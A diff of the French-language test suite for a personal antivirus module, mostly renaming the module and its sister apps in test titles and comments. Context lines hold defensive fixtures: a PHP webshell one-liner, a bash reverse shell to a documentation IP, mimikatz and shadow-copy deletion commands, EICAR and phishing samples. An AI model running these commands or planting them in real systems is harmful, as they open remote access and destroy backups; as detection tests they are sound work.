@@ -1,4 +1,4 @@
-// Ullr, l'antivirus d'Odin. Tous les échantillons d'ici sont INOFFENSIFS : le fichier de test standard
+// Asclépios, l'antivirus d'Odin. Tous les échantillons d'ici sont INOFFENSIFS : le fichier de test standard
 // des antivirus (EICAR), et des textes qui ressemblent à des attaques sans rien pouvoir faire.
 // Aucun vrai malware n'est téléchargé ni créé.
 import assert from 'node:assert/strict';
@@ -44,7 +44,7 @@ function tar(files: Array<{ name: string; data: Buffer }>): Buffer {
 }
 
 // ---------------------------------------------------------------- Le moteur
-test('Ullr · vrai type d\'un fichier : le contenu, pas le nom', () => {
+test('Asclépios · vrai type d\'un fichier : le contenu, pas le nom', () => {
   assert.equal(fileType(Buffer.concat([Buffer.from('MZ'), Buffer.alloc(100)]), 'photo.jpg'), 'pe');
   assert.equal(fileType(Buffer.from('7f454c4602010100', 'hex'), 'rapport.pdf'), 'elf');
   assert.equal(fileType(Buffer.from('%PDF-1.7\n'), 'x'), 'pdf');
@@ -61,7 +61,7 @@ test('Ullr · vrai type d\'un fichier : le contenu, pas le nom', () => {
   assert.ok(entropy(Buffer.from('aaaaaaaaaaaaaaaa')) < 0.1 && entropy(Buffer.from(Array.from({ length: 4096 }, (_x, i) => (i * 7919) % 256))) > 7.5);
 });
 
-test('Ullr · le fichier de test EICAR est reconnu partout : seul, compressé, dans une archive, dans une archive dans une archive', () => {
+test('Asclépios · le fichier de test EICAR est reconnu partout : seul, compressé, dans une archive, dans une archive dans une archive', () => {
   for (const [name, content] of [
     ['eicar.com', Buffer.from(EICAR)], ['eicar.txt', Buffer.from(EICAR)], ['eicar.com.gz', gzipSync(Buffer.from(EICAR))],
     ['archive.zip', zip([{ name: 'lisezmoi.txt', data: Buffer.from('rien') }, { name: 'dossier/eicar.com', data: Buffer.from(EICAR) }])],
@@ -79,7 +79,7 @@ test('Ullr · le fichier de test EICAR est reconnu partout : seul, compressé, d
   assert.equal(inner?.file, 'double.zip!interieur.zip!eicar.com', 'le chemin à l\'intérieur des archives est donné');
 });
 
-test('Ullr · archives : bombe de décompression repérée sans saturer, archive à mot de passe signalée, limites tenues', () => {
+test('Asclépios · archives : bombe de décompression repérée sans saturer, archive à mot de passe signalée, limites tenues', () => {
   const bomb = zip([{ name: 'gros.bin', data: Buffer.alloc(24 * 1024 * 1024) }]);
   assert.ok(bomb.length < 100_000, 'la bombe pèse quelques Ko');
   const z = unzip(bomb, { maxEach: 4 * 1024 * 1024 });
@@ -91,7 +91,7 @@ test('Ullr · archives : bombe de décompression repérée sans saturer, archive
   assert.equal(unzip(zip(Array.from({ length: 30 }, (_x, i) => ({ name: `f${i}`, data: Buffer.from('a') }))), { maxEntries: 10 }).truncated, true);
 });
 
-test('Ullr · chaque classe de menace est reconnue, avec sa raison et sa technique d\'attaque', () => {
+test('Asclépios · chaque classe de menace est reconnue, avec sa raison et sa technique d\'attaque', () => {
   const cases: Array<[string, Buffer | string, string, boolean]> = [
     ['shell.php', WEBSHELL, 'PHP.Webshell (eval encodé)', true],
     ['cmd.php', '<?php system($_GET["c"]); ?>', 'PHP.Webshell (commande depuis la requête)', true],
@@ -129,7 +129,7 @@ test('Ullr · chaque classe de menace est reconnue, avec sa raison et sa techniq
   assert.ok(threats(docm).includes('Document avec macros') && threats(docm).includes('Macro qui lance des commandes'), threats(docm).join(' | '));
 });
 
-test('Ullr · pas de fausse alerte : fichiers ordinaires, documentation de sécurité, installateurs honnêtes, bibliothèques', () => {
+test('Asclépios · pas de fausse alerte : fichiers ordinaires, documentation de sécurité, installateurs honnêtes, bibliothèques', () => {
   const clean: Array<[string, string, string?]> = [
     ['note.txt', 'Bonjour, voici le compte rendu de la réunion de mardi.'],
     ['cours-securite.md', `Un shell inversé ressemble à : \`bash -i >& /dev/tcp/203.0.113.5/4444 0>&1\`. Un webshell : \`${WEBSHELL}\`. Outil : sekurlsa::logonpasswords, privilege::debug, vssadmin delete shadows.`],
@@ -151,7 +151,7 @@ test('Ullr · pas de fausse alerte : fichiers ordinaires, documentation de sécu
   assert.equal(doc.level, undefined); assert.match(flat(doc)[0].why, /documentation, un test ou une règle/);
 });
 
-test('Ullr · score explicable : les indices se cumulent sans dépasser 100, et chaque seuil a un sens', () => {
+test('Asclépios · score explicable : les indices se cumulent sans dépasser 100, et chaque seuil a un sens', () => {
   assert.deepEqual(combine([]), { score: 0, level: undefined });
   assert.equal(combine([{ score: 30 } as never]).level, undefined, 'un seul indice faible : pas d\'alerte');
   assert.equal(combine([{ score: 30 } as never, { score: 30 } as never]).level, 'moyenne', 'deux indices faibles : à vérifier');
@@ -160,7 +160,7 @@ test('Ullr · score explicable : les indices se cumulent sans dépasser 100, et 
   assert.equal(combine([{ score: 100 } as never, { score: 100 } as never]).score, 100);
 });
 
-test('Ullr · règles Galdr (maison) : chaînes, expressions, « il faut N », filtre de fichiers, accents', () => {
+test('Asclépios · règles Grimoire (maison) : chaînes, expressions, « il faut N », filtre de fichiers, accents', () => {
   const set = new RuleSet([
     { name: 'Deux sur trois', level: 'haute' as const, strings: ['alpha', '/b[eé]ta/i', 'gamma'], need: 2 },
     { name: 'Tous', level: 'critique' as const, strings: ['un', 'deux'], need: 'tous' as const },
@@ -178,7 +178,7 @@ test('Ullr · règles Galdr (maison) : chaînes, expressions, « il faut N », f
   assert.throws(() => compileGaldr({ name: 'cassée', level: 'haute', strings: ['/(/'], need: 'un' }), 'une expression invalide est refusée à l\'ajout');
 });
 
-test('Ullr · règles YARA importées : sous-ensemble compris, le reste écarté et compté', () => {
+test('Asclépios · règles YARA importées : sous-ensemble compris, le reste écarté et compté', () => {
   const src = `
 /* commentaire */
 rule Test_Webshell_Generic : webshell {
@@ -244,7 +244,7 @@ private rule Privee { strings: $a = "x" condition: $a }
   assert.equal(y.rules.find((r) => r.name === 'Test_Webshell_Generic')!.klass, 'webshell', 'la classe est déduite du nom et de la description');
 });
 
-test('Ullr · adresses web : imitation de marque, lettres remplacées, vrais sites jamais signalés', () => {
+test('Asclépios · adresses web : imitation de marque, lettres remplacées, vrais sites jamais signalés', () => {
   const risk = (u: string) => combine(urlRisk(u));
   for (const good of ['https://www.paypal.com/signin', 'https://storage.googleapis.com/x', 'https://free-download.com', 'https://pineapple.com', 'https://impots.gouv.fr/', 'https://login.microsoftonline.com/x', 'https://toufatech.com', 'https://oqgbarber.com/reserver', 'https://orange.es', 'https://mon-cafe.exemple.com', 'https://www.credit-agricole.fr/'])
     assert.equal(risk(good).score, 0, `${good} : rien à signaler (${urlRisk(good).map((f) => f.threat).join(' | ')})`);
@@ -255,7 +255,7 @@ test('Ullr · adresses web : imitation de marque, lettres remplacées, vrais sit
   assert.equal(regDomain('paypal.com.secure-login.xyz'), 'secure-login.xyz'); assert.equal(regDomain('www.impots.gouv.fr'), 'impots.gouv.fr'); assert.equal(regDomain('a.b.exemple.co.uk'), 'exemple.co.uk');
 });
 
-test('Ullr · hameçonnage dans un message ou une page : pression, lien menteur, expéditeur, pièce jointe', () => {
+test('Asclépios · hameçonnage dans un message ou une page : pression, lien menteur, expéditeur, pièce jointe', () => {
   const mail = 'From: "Service client" <service@banque-exemple.fr>\nReply-To: <recup@autre-domaine.xyz>\nSubject: Urgent\nAuthentication-Results: mx; spf=fail\nContent-Disposition: attachment; filename="facture.html"\n\nVotre compte sera suspendu sous 24 h. <a href="http://203.0.113.9/login">https://www.labanquepostale.fr/connexion</a>';
   const f = phishing(mail, 'eml'), names = f.map((x) => x.threat);
   for (const t of ['Message qui met la pression', 'Lien qui ment sur sa destination', 'La réponse part vers une autre adresse', 'Expéditeur non authentifié', 'Pièce jointe à risque']) assert.ok(names.includes(t), `« ${t} » attendu, trouvé ${names.join(' | ')}`);
@@ -265,7 +265,7 @@ test('Ullr · hameçonnage dans un message ou une page : pression, lien menteur,
 });
 
 // ---------------------------------------------------------------- La base de connaissances (paquets signés)
-test('Ullr · base de signatures : paquet signé, testé avant activation, altération refusée, retour arrière', () => {
+test('Asclépios · base de signatures : paquet signé, testé avant activation, altération refusée, retour arrière', () => {
   const dir = mkdtempSync(join(tmpdir(), 'odin-ullr-intel-'));
   try {
     const intel = new Intel(dir); assert.equal(intel.load().version, 0); assert.equal(intel.hashCount(), 0);
@@ -305,7 +305,7 @@ test('Ullr · base de signatures : paquet signé, testé avant activation, alté
   } finally { rmSync(dir, { recursive: true, force: true }); }
 });
 
-test('Ullr · formats des sources : MalwareBazaar, ThreatFox, URLhaus/OpenPhish, listes de sites, Stalkerware, CISA KEV, ClamAV', () => {
+test('Asclépios · formats des sources : MalwareBazaar, ThreatFox, URLhaus/OpenPhish, listes de sites, Stalkerware, CISA KEV, ClamAV', () => {
   const h = 'a'.repeat(64), h2 = 'b'.repeat(64);
   assert.deepEqual(csvLine('"a, b", "c ""d""", e'), ['a, b', 'c "d"', 'e']);
   const mb = `################\n# MalwareBazaar recent malware samples #\n# "first_seen_utc","sha256_hash","md5_hash","sha1_hash","reporter","file_name","file_type_guess","mime_type","signature","clamav","vtpercent","imphash","ssdeep","tlsh"\n"2026-11-10 10:00:00", "${h}", "${'c'.repeat(32)}", "${'d'.repeat(40)}", "abuse_ch", "invoice, final.exe", "exe", "application/x-dosexec", "AgentTesla", "n/a", "45.2", "x", "y", "z"\n"2026-11-10 10:01:00", "${h2}", "${'c'.repeat(32)}", "${'d'.repeat(40)}", "x", "a.dll", "dll", "application/x-dosexec", "n/a", "n/a", "n/a", "", "", ""\n`;
@@ -329,7 +329,7 @@ test('Ullr · formats des sources : MalwareBazaar, ThreatFox, URLhaus/OpenPhish,
 });
 
 // ---------------------------------------------------------------- Les incidents (signaux reliés entre applis)
-test('Ullr · incidents : un signal seul ne dit rien, deux applis qui se recoupent font un incident, et la réponse reste annulable', () => {
+test('Asclépios · incidents : un signal seul ne dit rien, deux applis qui se recoupent font un incident, et la réponse reste annulable', () => {
   const at = Date.parse('2026-11-11T10:00:00Z'), sig = (module: string, type: string, data: Record<string, unknown>, min = 0) => toSignal({ module, type, data }, at + min * 60_000)!;
   // Des signaux faibles, même nombreux, n'ouvrent rien : une machine chargée et un conteneur arrêté ne sont pas une attaque.
   let c = new Correlator();
@@ -358,7 +358,7 @@ test('Ullr · incidents : un signal seul ne dit rien, deux applis qui se recoupe
   // Rançongiciel : un fichier sentinelle touché suffit, tout de suite, au niveau critique.
   c = new Correlator();
   const r3 = c.add(sig('ullr', 'sentinelle', { fichier: '/home/awa/Documents/!000-ne-pas-toucher.docx', action: 'modifié' }));
-  assert.equal(r3.incident?.kind, 'rançongiciel'); assert.equal(r3.incident?.level, 'critique'); assert.match(r3.incident!.proposed.join(' '), /restaure les fichiers depuis Sindri/);
+  assert.equal(r3.incident?.kind, 'rançongiciel'); assert.equal(r3.incident?.level, 'critique'); assert.match(r3.incident!.proposed.join(' '), /restaure les fichiers depuis Phénix/);
   // Mot de passe d'Odin : 4 refus ne font rien, le 5e ouvre un incident, le 7e bannit l'adresse (extérieure).
   c = new Correlator(); let last = c.add(sig('odin', 'connexion_refusee', { ip: '203.0.113.200' }));
   for (let i = 1; i < 4; i++) last = c.add(sig('odin', 'connexion_refusee', { ip: '203.0.113.200' }, i));
@@ -367,13 +367,13 @@ test('Ullr · incidents : un signal seul ne dit rien, deux applis qui se recoupe
   assert.equal(last.incident?.kind, 'force brute'); assert.deepEqual(last.responses, []);
   last = c.add(sig('odin', 'connexion_refusee', { ip: '203.0.113.200' }, 6)); last = c.add(sig('odin', 'connexion_refusee', { ip: '203.0.113.200' }, 7));
   assert.deepEqual(last.responses.map((x) => x.ip), ['203.0.113.200']); assert.equal(last.incident?.level, 'haute');
-  // Un pirate dans un piège, déjà banni par Loki : ce n'est pas un incident (le piège fait son travail), et pas de double bannissement.
+  // Un pirate dans un piège, déjà banni par Sirènes : ce n'est pas un incident (le piège fait son travail), et pas de double bannissement.
   c = new Correlator();
   for (let i = 0; i < 8; i++) { c.add(sig('loki', 'piege', { piège: 'narfi', ip: '203.0.113.9', type: 'identifiants', détail: 'root / 123456' }, i)); c.add(sig('garmr', 'banni', { ip: '203.0.113.9', raison: 'piège' }, i)); }
   assert.equal(c.incidents.length, 0);
   // …mais s'il s'attaque aussi à la porte d'Odin, c'est une attaque ciblée.
   const r4 = c.add(sig('odin', 'connexion_refusee', { ip: '203.0.113.9' }, 9));
-  assert.equal(r4.incident?.kind, 'attaque ciblée'); assert.deepEqual(r4.responses, [], 'déjà banni par Loki : pas de second bannissement');
+  assert.equal(r4.incident?.kind, 'attaque ciblée'); assert.deepEqual(r4.responses, [], 'déjà banni par Sirènes : pas de second bannissement');
   // Score : borné, et un simple contexte répété ne gonfle pas.
   assert.ok(score(Array.from({ length: 50 }, () => sig('eir', 'mesure', { cpu: 99 }))) < 30);
   assert.equal(c.set(r4.incident!.id, 'traité')?.state, 'traité');
@@ -400,7 +400,7 @@ function world(o: { keys?: boolean } = {}): World {
 }
 const act = (w: World, action: string, input: Record<string, unknown> = {}) => w.v.act('ullr', action, input);
 
-test('Ullr · analyse d\'un dossier : rapport horodaté, menace sûre mise en quarantaine (annulable), soupçon laissé à ta décision, EICAR laissé en place', async () => {
+test('Asclépios · analyse d\'un dossier : rapport horodaté, menace sûre mise en quarantaine (annulable), soupçon laissé à ta décision, EICAR laissé en place', async () => {
   const w = world();
   try {
     const d = join(w.home, 'workspace', 'inbox'); mkdirSync(join(d, 'sous'), { recursive: true }); mkdirSync(join(d, 'exclu'), { recursive: true });
@@ -440,7 +440,7 @@ test('Ullr · analyse d\'un dossier : rapport horodaté, menace sûre mise en qu
     assert.match((await act(w, 'fichier', { chemin: join(d, 'maj.ps1') })).text, /^✓ Rien de dangereux/);
     assert.match((await act(w, 'exceptions')).text, /dossier .*sous[\s\S]*empreinte [a-f0-9]{64}/);
     await assert.rejects(async () => { const x = await act(w, 'exception', { quoi: '/' }); if (x.ok === false) throw new Error(x.text); }, /trop large/);
-    // Verdict d'un fichier seul : commence par ⚠, donne le type réel et l'empreinte (Loki et Skögul s'en servent).
+    // Verdict d'un fichier seul : commence par ⚠, donne le type réel et l'empreinte (Sirènes et Némésis s'en servent).
     const one = await act(w, 'fichier', { chemin: join(d, 'eicar.com') });
     assert.match(one.text, /^⚠ Test antivirus EICAR \(règle\) — score 40\/100/); assert.match(one.text, new RegExp(`empreinte SHA-256 : ${sha(EICAR)}`));
     // Un fichier du système n'est jamais déplacé tout seul.
@@ -450,7 +450,7 @@ test('Ullr · analyse d\'un dossier : rapport horodaté, menace sûre mise en qu
   } finally { w.end(); }
 });
 
-test('Ullr · chemins Linux, macOS et Windows : dossiers en exception et fichiers du système', () => {
+test('Asclépios · chemins Linux, macOS et Windows : dossiers en exception et fichiers du système', () => {
   assert.equal(excepted(['/home/awa/projets'], '/home/awa/projets/a/b.php'), true);
   assert.equal(excepted(['/home/awa/projets/'], '/home/awa/projets'), true, 'le dossier lui-même');
   assert.equal(excepted(['/home/awa/projets'], '/home/awa/projets-secrets/b.php'), false, 'un dossier au nom voisin n\'est pas couvert');
@@ -462,7 +462,7 @@ test('Ullr · chemins Linux, macOS et Windows : dossiers en exception et fichier
   for (const f of ['/home/awa/a.sh', '/usr/local/bin/outil', '/tmp/x', '/Library/LaunchDaemons/x.plist', 'C:\\Users\\awa\\Downloads\\x.exe', 'C:\\Windows\\Temp\\x.exe']) assert.equal(vital(f), false, f);
 });
 
-test('Ullr · dans un dossier de tests d\'un projet, une règle ne déplace rien : c\'est toi qui décides', async () => {
+test('Asclépios · dans un dossier de tests d\'un projet, une règle ne déplace rien : c\'est toi qui décides', async () => {
   const w = world();
   try {
     const d = join(w.home, 'projets', 'site', 'tests', 'fixtures'); mkdirSync(d, { recursive: true }); writeFileSync(join(d, 'shell.php'), WEBSHELL);
@@ -472,7 +472,7 @@ test('Ullr · dans un dossier de tests d\'un projet, une règle ne déplace rien
   } finally { w.end(); }
 });
 
-test('Ullr · protection en continu : un fichier qui arrive est analysé tout seul ; fichiers sentinelles contre les rançongiciels', async () => {
+test('Asclépios · protection en continu : un fichier qui arrive est analysé tout seul ; fichiers sentinelles contre les rançongiciels', async () => {
   const w = world();
   try {
     const inbox = join(w.home, 'workspace', 'inbox'), docs = join(w.home, 'Documents'); mkdirSync(inbox, { recursive: true }); mkdirSync(docs, { recursive: true });
@@ -487,12 +487,12 @@ test('Ullr · protection en continu : un fichier qui arrive est analysé tout se
     await wait(200); writeFileSync(canary, 'CHIFFRÉ PAR UN RANÇONGICIEL');
     assert.ok(await until(() => w.v.alerts({ module: 'ullr' }).some((a) => /Incident : Comportement de rançongiciel/.test(a.title))), 'incident ouvert');
     const a = w.v.alerts({ module: 'ullr' }).find((x) => /rançongiciel/.test(x.title))!;
-    assert.equal(a.level, 'critique'); assert.match(a.detail ?? '', /fichier sentinelle a été modifié[\s\S]*restaure les fichiers depuis Sindri/);
+    assert.equal(a.level, 'critique'); assert.match(a.detail ?? '', /fichier sentinelle a été modifié[\s\S]*restaure les fichiers depuis Phénix/);
     assert.match((await act(w, 'incidents')).text, /Comportement de rançongiciel[\s\S]*ouvert/);
     // Lien avec le Cerveau : l'incident a sa note, reliée aux applis ; la classer complète la note.
     assert.ok(await until(() => existsSync(join(w.home, 'cerveau')) && readdirSync(join(w.home, 'cerveau')).some((f) => /^Incident /.test(f))), 'note de l\'incident dans le Cerveau');
     const note = join(w.home, 'cerveau', readdirSync(join(w.home, 'cerveau')).find((f) => /^Incident /.test(f))!);
-    assert.match(readFileSync(note, 'utf8'), /#sécurité #incident[\s\S]*fichier sentinelle[\s\S]*\[\[Ullr\]\]/);
+    assert.match(readFileSync(note, 'utf8'), /#sécurité #incident[\s\S]*fichier sentinelle[\s\S]*\[\[Asclépios\]\]/);
     const id = (w.v.ctx('ullr').settings.incidents as Array<{ id: string }>)[0].id;
     assert.match((await act(w, 'incident', { incident: id, etat: 'traité' })).text, /traité/);
     assert.ok(await until(() => /Incident classé : traité/.test(readFileSync(note, 'utf8'))));
@@ -501,7 +501,7 @@ test('Ullr · protection en continu : un fichier qui arrive est analysé tout se
   } finally { w.end(); }
 });
 
-test('Ullr · mises à jour : sources interrogées, paquet testé puis activé, empreinte connue détectée, base polluée refusée, retour arrière', async () => {
+test('Asclépios · mises à jour : sources interrogées, paquet testé puis activé, empreinte connue détectée, base polluée refusée, retour arrière', async () => {
   const w = world({ keys: true });
   try {
     const sample = Buffer.from(`échantillon inoffensif ${Math.random()}`), d = join(w.home, 'workspace', 'inbox'); mkdirSync(d, { recursive: true });
@@ -534,7 +534,7 @@ test('Ullr · mises à jour : sources interrogées, paquet testé puis activé, 
     assert.match((await act(w, 'adresse', { lien: 'http://paypa1.com' })).text, /Imite une marque en changeant des lettres/);
     assert.match((await act(w, 'message', { texte: 'Votre colis est en attente : http://distribue.mechant-exemple.net/a.exe' })).text, /Lien connu comme dangereux[\s\S]*Ne clique sur aucun lien/);
     assert.match((await act(w, 'failles')).text, /1 failles exploitées connues[\s\S]*CVE-2026-4242 · Exemple Serveur[\s\S]*rançongiciels/);
-    assert.match((await act(w, 'sources')).text, /MalwareBazaar \(empreintes\) : 1 le \d{4}[\s\S]*VirusTotal \(réputation\) : à la demande · prête[\s\S]*FireHOL et Feodo Tracker \(adresses IP\) : tenue à jour par l'appli Geri[\s\S]*ClamAV \(référence\) : référence, non branchée/);
+    assert.match((await act(w, 'sources')).text, /MalwareBazaar \(empreintes\) : 1 le \d{4}[\s\S]*VirusTotal \(réputation\) : à la demande · prête[\s\S]*FireHOL et Feodo Tracker \(adresses IP\) : tenue à jour par l'appli Méduse[\s\S]*ClamAV \(référence\) : référence, non branchée/);
     assert.match((await act(w, 'versions')).text, /version 1 \(en service\).*✓ signature valide/);
     // Une liste polluée (elle contient un fichier sain du système) est refusée : l'ancienne version reste.
     mbHashes = [sha(readFileSync(new URL('../src/valhalla/types.ts', import.meta.url)))];
@@ -553,7 +553,7 @@ test('Ullr · mises à jour : sources interrogées, paquet testé puis activé, 
   } finally { w.end(); }
 });
 
-test('Ullr · réputation en ligne : seule l\'empreinte part, jamais le fichier ; un soupçon confirmé devient une quarantaine, un fichier connu comme sain est calmé', async () => {
+test('Asclépios · réputation en ligne : seule l\'empreinte part, jamais le fichier ; un soupçon confirmé devient une quarantaine, un fichier connu comme sain est calmé', async () => {
   const w = world({ keys: true });
   try {
     const d = join(w.home, 'workspace', 'inbox'); mkdirSync(d, { recursive: true });
@@ -585,7 +585,7 @@ test('Ullr · réputation en ligne : seule l\'empreinte part, jamais le fichier 
   } finally { w.end(); }
 });
 
-test('Ullr · sans clé ni réseau : il fonctionne quand même (règles de base), et le dit', async () => {
+test('Asclépios · sans clé ni réseau : il fonctionne quand même (règles de base), et le dit', async () => {
   const w = world();
   try {
     const up = await act(w, 'mettre_a_jour');
@@ -599,7 +599,7 @@ test('Ullr · sans clé ni réseau : il fonctionne quand même (règles de base)
   } finally { w.end(); }
 });
 
-test('Ullr · clés des sources : rangées avec les secrets d\'Odin, jamais affichées, forme vérifiée', async () => {
+test('Asclépios · clés des sources : rangées avec les secrets d\'Odin, jamais affichées, forme vérifiée', async () => {
   const w = world(), saved: Array<[string, string]> = [];
   try {
     ullrKeys((n, v) => { saved.push([n, v]); process.env[n] = v; });
@@ -616,7 +616,7 @@ test('Ullr · clés des sources : rangées avec les secrets d\'Odin, jamais affi
   } finally { ullrKeys(undefined); w.end(); }
 });
 
-test('Ullr · plans d\'analyse, règle Galdr ajoutée, arrêt d\'une analyse, page de l\'appli', async () => {
+test('Asclépios · plans d\'analyse, règle Grimoire ajoutée, arrêt d\'une analyse, page de l\'appli', async () => {
   const w = world();
   try {
     const d = join(w.home, 'docs'); mkdirSync(d); writeFileSync(join(d, 'a.sh'), '#!/bin/sh\necho MOT-INTERDIT-ESSAI\n');
@@ -661,7 +661,7 @@ test('Ullr · plans d\'analyse, règle Galdr ajoutée, arrêt d\'une analyse, pa
   } finally { w.end(); }
 });
 
-test('Ullr · relié aux autres applis : mots de passe d\'Odin refusés → incident → adresse bannie par Garmr (annulable) → note dans le Cerveau', async () => {
+test('Asclépios · relié aux autres applis : mots de passe d\'Odin refusés → incident → adresse bannie par Cerbère (annulable) → note dans le Cerveau', async () => {
   const w = world();
   try {
     for (let i = 0; i < 7; i++) w.v.events.emit('event', { module: 'odin', type: 'connexion_refusee', data: { ip: '203.0.113.200' }, at: new Date().toISOString() });
@@ -675,7 +675,7 @@ test('Ullr · relié aux autres applis : mots de passe d\'Odin refusés → inci
     w.ran.length = 0;
     for (let i = 0; i < 9; i++) w.v.events.emit('event', { module: 'odin', type: 'connexion_refusee', data: { ip: '192.168.1.77' }, at: new Date().toISOString() });
     await wait(150); assert.ok(!w.ran.some((c) => /192\.168\.1\.77/.test(c)));
-    // Sans IA : « les incidents », « analyse le fichier … », « mets à jour les signatures » sont compris par Huginn.
+    // Sans IA : « les incidents », « analyse le fichier … », « mets à jour les signatures » sont compris par Logos.
     assert.match((await w.v.order('les incidents de sécurité')).text, /deviner ton mot de passe/);
     assert.equal((await w.v.order('analyse le fichier /tmp/x.sh')).understood?.kind, 'action');
   } finally { w.end(); }
